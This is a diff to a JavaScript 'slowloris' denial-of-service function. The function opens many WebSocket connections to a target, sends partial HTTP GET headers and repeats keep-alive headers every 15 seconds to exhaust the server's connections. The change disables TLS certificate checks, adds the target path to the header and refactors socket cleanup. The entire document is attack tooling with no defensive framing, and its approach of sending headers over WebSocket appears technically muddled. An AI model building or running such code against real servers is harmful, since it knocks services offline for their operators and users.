@@ -29,12 +29,13 @@ function slowloris(target, numSockets) {
       try {
         const protocol = isSecure ? 'wss://' : 'ws://';
         socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
-            origin: `${protocol}${hostname}` // Setting origin
+            origin: `${protocol}${hostname}`, // Setting origin
+            rejectUnauthorized: false // Disable SSL certificate verification (use with caution!)
         });
 
         socket.on('open', () => {
           console.log(`Socket ${index + 1} opened.`);
-          sendInitialHeader(socket, hostname); // Send initial header
+          sendInitialHeader(socket, hostname, path); // Send initial header with path
           setInterval(() => {
             sendKeepAliveHeader(socket); // Send keep-alive header
           }, 15000);
@@ -46,32 +47,20 @@ function slowloris(target, numSockets) {
 
         socket.on('error', (error) => {
           console.error(`Socket ${index + 1} error: ${error.message}`);
-          try {
-            if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
-                socket.close();
-            }
-          } catch (closeError) {
-            console.error(`Error closing socket ${index + 1}:`, closeError.message);
-          }
+          cleanupSocket(socket, index);
         });
       } catch (socketError) {
         console.error(`Error creating socket ${index + 1}:`, socketError.message);
       }
     }
 
-    function sendInitialHeader(socket, hostname) {
-      const initialHeader = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n`;
+    function sendInitialHeader(socket, hostname, path) {
+      const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n`;
       try {
         socket.send(initialHeader);
       } catch (error) {
         console.error("Error sending initial header:", error.message);
-        try {
-          if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
-            socket.close();
-          }
-        } catch (closeError) {
-          console.error("Error closing socket after send error:", closeError.message);
-        }
+        cleanupSocket(socket);
       }
     }
 
@@ -81,15 +70,26 @@ function slowloris(target, numSockets) {
         socket.send(keepAliveHeader);
       } catch (error) {
         console.error("Error sending keep-alive header:", error.message);
-        try {
-          if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
-            socket.close();
-          }
-        } catch (closeError) {
-          console.error("Error closing socket after send error:", closeError.message);
-        }
+        cleanupSocket(socket);
       }
     }
+
+    function cleanupSocket(socket, index) {
+        try {
+            if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
+                socket.close();
+            }
+        } catch (closeError) {
+            if (index !== undefined) {
+                console.error(`Error closing socket ${index + 1}:`, closeError.message);
+            } else {
+                console.error("Error closing socket:", closeError.message);
+            }
+
+        }
+    }
+
+
   } catch (error) {
     console.error("Error during Slowloris setup:", error.message);
   }
